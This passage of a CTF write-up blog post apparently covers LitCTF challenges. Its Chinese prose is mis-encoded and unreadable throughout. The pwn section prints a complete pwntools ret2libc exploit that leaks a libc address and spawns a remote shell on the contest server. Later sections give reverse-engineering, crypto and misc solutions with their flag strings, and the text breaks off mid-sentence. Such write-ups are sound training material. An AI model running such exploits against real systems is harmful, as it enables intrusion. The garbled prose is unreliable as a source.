class="markdownIt-Anchor" href="#3-ç‹ ç‹ çš„æº¢å‡ºæ¶…~">#</a> 3ã€ç‹ ç‹ çš„æº¢å‡ºæ¶…ï½</h2><p>â€‹æ£€æŸ¥ä¿æŠ¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@MSI:/mnt/c/Users/20820/Downloads/ubuntu_pwn# checksec pwn4</span><br><span class="line">[*] &#x27;/mnt/c/Users/20820/Downloads/ubuntu_pwn/pwn4&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>â€‹IDA åç¼–è¯‘ï¼›</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">91</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// [rsp+6Bh] [rbp-5h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+6Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Leave your message:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">0x50</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ok,Message Received&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å‘ç°å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œä½†æ˜¯ï¼Œä¹Ÿå­˜åœ¨è¿‡æ»¤ï¼Œå°±æ˜¯è·å– buf çš„å¤§å°ï¼Œç„¶åä¸ 0x50u è¿›è¡Œå¤§å°æ¯”è¾ƒï¼Œæ²¡æœ‰åé—¨å‡½æ•°ï¼Œé‚£ä¹ˆå°±æ˜¯ä¸ª ret2libcï¼Œç›´æ¥å¥—å…¬å¼åšäº†ã€‚</p><p>â€‹å…ˆé€šè¿‡ puts å‡½æ•°æ³„éœ² puts å‡½æ•°æœ¬èº«çš„çœŸå®åœ°å€ï¼Œä¹‹åé€šè¿‡ libc æ–‡ä»¶æˆ–è€… LibcSearcher åº“æŸ¥ç‰ˆæœ¬æ‹¿ system å’Œ /bin/sh çš„åœ°å€ï¼Œexp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context (os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;140&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&#x27;./pwn4&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(pwnfile)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28607</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4007d3</span></span><br><span class="line">pop_ret = <span class="number">0x400556</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x4006B0</span></span><br><span class="line">pay = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x60</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;message:\n&#x27;</span>, pay)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">pay2 = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x68</span>) + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)</span><br><span class="line">io.recvuntil(<span class="string">&quot;message:&quot;</span>)</span><br><span class="line">io.sendline(pay2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>â€‹flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;u_r_master_of_stackoverflow_and_intoverflow&#125;</span><br></pre></td></tr></table></figure><h1 id="re"><a class="markdownIt-Anchor" href="#re">#</a> Reï¼š</h1><h2 id="1-ä¸–ç•Œä¸Šæœ€æ£’çš„ç¨‹åºå‘˜"><a class="markdownIt-Anchor" href="#1-ä¸–ç•Œä¸Šæœ€æ£’çš„ç¨‹åºå‘˜">#</a> 1ã€ä¸–ç•Œä¸Šæœ€æ£’çš„ç¨‹åºå‘˜</h2><p>â€‹shift+f12 ç›´æ¥æ‰¾åˆ° flagï¼šFlag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;I_am_the_best_programmer_ever&#125;</span><br></pre></td></tr></table></figure><h2 id="2-ez_xor"><a class="markdownIt-Anchor" href="#2-ez_xor">#</a> 2ã€ez_XORï¼š</h2><p>â€‹ç›´æ¥ä¸Šæºç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+0h] [ebp-80h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v5; <span class="comment">// [esp+4h] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v6; <span class="comment">// [esp+8h] [ebp-78h]</span></span><br><span class="line">  <span class="type">char</span> Str1[<span class="number">50</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str2[<span class="number">26</span>]; <span class="comment">// [esp+4Eh] [ebp-32h] BYREF</span></span><br><span class="line">  __int16 v9; <span class="comment">// [esp+68h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+6Ah] [ebp-16h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+6Eh] [ebp-12h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+72h] [ebp-Eh]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+76h] [ebp-Ah]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+7Ah] [ebp-6h]</span></span><br><span class="line">  __int16 v15; <span class="comment">// [esp+7Eh] [ebp-2h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  <span class="built_in">strcpy</span>(Str2, <span class="string">&quot;E`&#125;J]OrQF[V8zV:hzpV&#125;fVF[t&quot;</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter The Right FLAG:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str1);</span><br><span class="line">  XOR(Str1, <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(Str1, Str2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;U Saved IT!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Wrong!Try again!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> main(v4, v5, v6);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹XOR å‡½æ•°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> __cdecl <span class="title function_">XOR</span><span class="params">(<span class="type">char</span> *Str, <span class="type">char</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">strlen</span>(Str);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    Str[i] ^= <span class="number">3</span> * a2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹é‚£ä¹ˆï¼Œå¤§è‡´å¯ä»¥çŸ¥é“äº†ï¼ŒE`} J] OrQF [V8zV:hzpV} fVF [t å­—æ®µä¸ 9 è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œæ‰€ä»¥ï¼Œå¯ä»¥å†™å‡ºå¦‚ä¸‹ expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;E`&#125;J]OrQF[V8zV:hzpV&#125;fVF[t&quot;</span></span><br><span class="line">b = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    c = <span class="built_in">ord</span>(i) ^ <span class="number">9</span></span><br><span class="line">    b += <span class="built_in">chr</span>(c)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><p>â€‹flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;XOR_1s_3asy_to_OR&#125;</span><br></pre></td></tr></table></figure><h2 id="3-enbase64"><a class="markdownIt-Anchor" href="#3-enbase64">#</a> 3ã€enbase64</h2><p>â€‹æ‰“æ–­ç‚¹åŠ¨æ€è°ƒè¯•ä¸€ä¸‹ã€‚ç„¶åå°±èƒ½çœ‹åˆ° sourceï¼šgJ1BRjQie/FIWhEslq7GxbnL26M4+HXUtcpmVTKaydOP38of5v90ZSwrkYzCAuND</p><p>â€‹è§£ç å³å¯ï¼Œå†çœ‹ basecheck (Str1) ä¸­æœ‰ str1 çš„å€¼ï¼Œç„¶å base64 è§£ç å³å¯ï¼š</p><p>â€‹flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;B@5E64_l5_tooo0_E3sy!!!!!&#125;</span><br></pre></td></tr></table></figure><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto">#</a> Crypto:</h1><h2 id="1-æ¢¦æƒ³æ˜¯çº¢è‰²çš„-åˆçº§"><a class="markdownIt-Anchor" href="#1-æ¢¦æƒ³æ˜¯çº¢è‰²çš„-åˆçº§">#</a> 1ã€æ¢¦æƒ³æ˜¯çº¢è‰²çš„ (åˆçº§)</h2><p>è‡ªç”±å‹å–„å…¬æ­£å…¬æ­£æ•¬ä¸šæ³•æ²»è‡ªç”±è‡ªç”±å’Œè°å¹³ç­‰è‡ªç”±è‡ªç”±å…¬æ­£æ³•æ²»è¯šä¿¡æ°‘ä¸»è¯šä¿¡è‡ªç”±è‡ªç”±è¯šä¿¡æ°‘ä¸»çˆ±å›½å‹å–„å¹³ç­‰è¯šä¿¡å¯Œå¼ºå‹å–„çˆ±å›½è‡ªç”±è¯šä¿¡æ°‘ä¸»æ•¬ä¸šçˆ±å›½è¯šä¿¡æ°‘ä¸»å‹å–„çˆ±å›½å¹³ç­‰çˆ±å›½çˆ±å›½æ•¬ä¸šæ•¬ä¸šå‹å–„çˆ±å›½å…¬æ­£æ•¬ä¸šçˆ±å›½æ•¬ä¸šå’Œè°æ–‡æ˜è¯šä¿¡æ–‡æ˜å‹å–„çˆ±å›½è‡ªç”±è¯šä¿¡æ°‘ä¸»çˆ±å›½çˆ±å›½è¯šä¿¡å’Œè°å‹å–„çˆ±å›½è‡ªç”±å‹å–„å¹³ç­‰çˆ±å›½å‹å–„å¹³ç­‰å‹å–„è‡ªç”±è¯šä¿¡è‡ªç”±å¹³ç­‰çˆ±å›½çˆ±å›½æ•¬ä¸šæ•¬ä¸šå‹å–„çˆ±å›½æ•¬ä¸šæ•¬ä¸šå‹å–„è‡ªç”±å‹å–„å¹³ç­‰è¯šä¿¡è‡ªç”±æ³•æ²»è¯šä¿¡å’Œè°</p><p>â€‹ä¸€çœ¼ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚åŠ å¯†ï¼Œæ— è„‘æ¢­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;ä¸ºä¹‹åˆ™æ˜“,ä¸ä¸ºåˆ™éš¾&#125;</span><br></pre></td></tr></table></figure><h2 id="2-hexhexåˆçº§"><a class="markdownIt-Anchor" href="#2-hexhexåˆçº§">#</a> 2ã€Hexï¼ŸHexï¼(åˆçº§)</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4c69744354467b746169313131636f6f6c6c616161217d</span><br></pre></td></tr></table></figure><p>â€‹æç¤º hex äº†ï¼Œæ— è„‘åå…­è¿›åˆ¶è§£å¯†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;tai111coollaaa!&#125;</span><br></pre></td></tr></table></figure><h2 id="3-ä½ æ˜¯æˆ‘çš„å…³é”®è¯keyworld-åˆçº§"><a class="markdownIt-Anchor" href="#3-ä½ æ˜¯æˆ‘çš„å…³é”®è¯keyworld-åˆçº§">#</a> 3ã€ä½ æ˜¯æˆ‘çš„å…³é”®è¯ (Keyworld) (åˆçº§)</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IFRURC&#123;X0S<span class="built_in">_</span>YP3<span class="built_in">_</span>JX<span class="built_in">_</span>HBXV0PA&#125;</span><br></pre></td></tr></table></figure><p>â€‹å…³é”®å­—åŠ å¯†ï¼Œkey æ˜¯ YOUï¼Œæç¤ºå¾ˆæ˜æ˜¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LITCTF&#123;Y0U_AR3_MY_KEYW0RD&#125;</span><br></pre></td></tr></table></figure><h2 id="4-å®¶äººä»¬è°æ‡‚å•Šrsaç­¾åˆ°éƒ½ä¸ä¼š-åˆçº§"><a class="markdownIt-Anchor" href="#4-å®¶äººä»¬è°æ‡‚å•Šrsaç­¾åˆ°éƒ½ä¸ä¼š-åˆçº§">#</a> 4ã€å®¶äººä»¬ï¼è°æ‡‚å•Šï¼ŒRSA ç­¾åˆ°éƒ½ä¸ä¼š (åˆçº§)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 12567387145159119014524309071236701639759988903138784984758783651292440613056150667165602473478042486784826835732833001151645545259394365039352263846276073</span></span><br><span class="line"><span class="string">q = 12716692565364681652614824033831497167911028027478195947187437474380470205859949692107216740030921664273595734808349540612759651241456765149114895216695451</span></span><br><span class="line"><span class="string">c = 108691165922055382844520116328228845767222921196922506468663428855093343772017986225285637996980678749662049989519029385165514816621011058462841314243727826941569954125384522233795629521155389745713798246071907492365062512521474965012924607857440577856404307124237116387085337087671914959900909379028727767057</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹å¤§ä½¬ç›´æ¥ç”¨å·¥å…·ä¸€æŠŠæ¢­<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NwbW9ua2V5L0NyeXB0bw=="> GitHub - spmonkey/Crypto</span> ç›´æ¥å·¥å…·ç›´æ¥è§£å¯†å³å¯ï¼Œæˆ‘ä¸çŸ¥ä¸ºå•¥ä¸‹è½½ä¸äº†è¿™ä¸ªå·¥å…·ï¼Œæ‰€ä»¥ç›´æ¥ä¸Šç­”æ¡ˆäº†ï¼š</p><p>â€‹flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;it_is_easy_to_solve_question_when_you_know_p_and_q&#125;</span><br></pre></td></tr></table></figure><h1 id="misc"><a class="markdownIt-Anchor" href="#misc">#</a> Misc;</h1><h2 id="1-what_1s_base-åˆçº§"><a class="markdownIt-Anchor" href="#1-what_1s_base-åˆçº§">#</a> 1ã€What_1s_BASE (åˆçº§)</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TGl0Q1RGe0tGQ19DcjR6eV9UaHVyM2RheV9WX21lXzUwfQ==</span><br></pre></td></tr></table></figure><p>â€‹ç›´æ¥ base64 è§£ç å³å¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;KFC_Cr4zy_Thur3day_V_me_50&#125;</span><br></pre></td></tr></table></figure><h2 id="2-404notfound-åˆçº§"><a class="markdownIt-Anchor" href="#2-404notfound-åˆçº§">#</a> 2ã€404notfound (åˆçº§)</h2><p>â€‹ä¸€å¼ å›¾ç‰‡ï¼Œè®°äº‹æœ¬æ‰“å¼€ï¼Œå‰å‡ è¡Œæœ‰ flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;Its_404_but_1ts_n0t_a_page&#125;</span><br></pre></td></tr></table></figure><h2 id="3-è¿™ç¾½æ¯›çƒæ€ä¹ˆåªæœ‰ä¸€åŠå•Šæ¼-åˆçº§"><a class="markdownIt-Anchor" href="#3-è¿™ç¾½æ¯›çƒæ€ä¹ˆåªæœ‰ä¸€åŠå•Šæ¼-åˆçº§">#</a> 3ã€è¿™ç¾½æ¯›çƒæ€ä¹ˆåªæœ‰ä¸€åŠå•Šï¼ˆæ¼ (åˆçº§)</h2><p>â€‹æ‹–åˆ° 010 é‡Œä¿®æ”¹é«˜åº¦ï¼Œä¹‹åå¾—åˆ° flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;Fl4g_0fcourse!&#125;</span><br></pre></td></tr></table></figure><h2 id="4-å–œæ¬¢æˆ‘çš„å‹ç¼©åŒ…ä¹ˆ-åˆçº§"><a class="markdownIt-Anchor" href="#4-å–œæ¬¢æˆ‘çš„å‹ç¼©åŒ…ä¹ˆ-åˆçº§">#</a> 4ã€å–œæ¬¢æˆ‘çš„å‹ç¼©åŒ…ä¹ˆ (åˆçº§)</h2><p>â€‹æç¤ºå‹ç¼©åŒ…å¯†ç æ˜¯ 6 ä½æ•°å­—ï¼Œç›´æ¥çˆ†ç ´è§£å‡ºå¯†ç æ˜¯ 114514ï¼Œå¥½è‡­çš„å¯†ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;Do-u-like-my-zip-p4ck?&#125;</span><br></pre></td></tr></table></figure><h2 id="5-take-me-hand-åˆçº§"><a class="markdownIt-Anchor" href="#5-take-me-hand-åˆçº§">#</a> 5ã€Take me hand (åˆçº§)</h2><p>â€‹æµé‡åŒ…åˆ†æï¼Œéšä¾¿è¿½è¸ªä¸€ä¸ª httpï¼Œåœ¨è¯·æ±‚çš„ POST æ•°æ®ä¸­æ‰¾åˆ° flagï¼Œç»è¿‡ url è§£ç ä¹‹åå¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;Give_y0ur_hand_to_me!!!_plz&#125;</span><br></pre></td></tr></table></figure><h2 id="6-ç ´æŸçš„å›¾ç‰‡åˆçº§"><a class="markdownIt-Anchor" href="#6-ç ´æŸçš„å›¾ç‰‡åˆçº§">#</a> 6ã€ç ´æŸçš„å›¾ç‰‡ (åˆçº§)</h2><p>â€‹æ–‡ä»¶ç”¨ 010editor ç¼–è¾‘ï¼Œæ·»ä¸Š % pngâ€¦ï¼Œä¹Ÿå°±æ˜¯ 89504E470D0A1A0Aï¼Œå†å°†å›¾ç‰‡é‡å‘½åä¸º.png å›¾ç‰‡ï¼Œæ‰“å¼€å›¾ç‰‡ä¾¿æ˜¯ flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;May you, the beauty of this world, always shine.&#125;</span><br></pre></td></tr></table></figure><h2 id="7-osintå°éº¦æœæ±"><a class="markdownIt-Anchor" href="#7-osintå°éº¦æœæ±">#</a> 7ã€Osint å°éº¦æœæ±</h2><p>â€‹æˆ‘ tmï¼Œæƒ³æš´æ‰“å‡ºé¢˜äººï¼Œç®—äº†ï¼Œå¿å¿ã€‚</p><p>â€‹ä¸Šé¢çœ‹åˆ°ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„å­—ç¬¦ï¼Œçœ‹èµ·æ¥åƒæ˜¯ wifi åï¼Œhacker&amp;craftï¼Œç›´æ¥åœ¨ç™¾åº¦åœ°å›¾æœç´¢é»‘å®¢ï¼Œå‘ç°äº†ä¸€ä¸ªåå­—ï¼Œé»‘å®¢ä¸ç²¾é…¿ï¼Œflagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;é»‘å®¢ä¸ç²¾é…¿&#125;</span><br></pre></td></tr></table></figure><h2 id="8-easy_shark"><a class="markdownIt-Anchor" href="#8-easy_shark">#</a> 8ã€easy_shark</h2><p>â€‹åˆæ˜¯ä¸ªæ¬ºè´Ÿæˆ‘ 010 æœ‰é—®é¢˜ï¼ŒçœŸæœäº†ï¼Œæƒ³æš´æ‰“å‡ºé¢˜äººã€‚</p><p>â€‹è¿˜æ˜¯è¯´ä¸‹æ€è·¯å°±è¡Œäº†å§ï¼Œæ‹–è¿› 010ï¼Œä¿®æ”¹ 90 00 ä¸º 00 00 å³å¯ï¼Œç„¶åä¸ç”¨å¯†ç è§£å‹ï¼Œè¿½è¸ª http æµï¼Œåœ¨å¤šä¸ª http æµä¸­æ‰¾åˆ°äº†ä¸€ä¸ª php ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åå†æ‰¾ï¼Œç¬¬äº”åå‡ ä¸ªå°±èƒ½æ‰¾åˆ°ä¸ªæ–¹ç¨‹ï¼Œç„¶åä¸¤ä¸ª 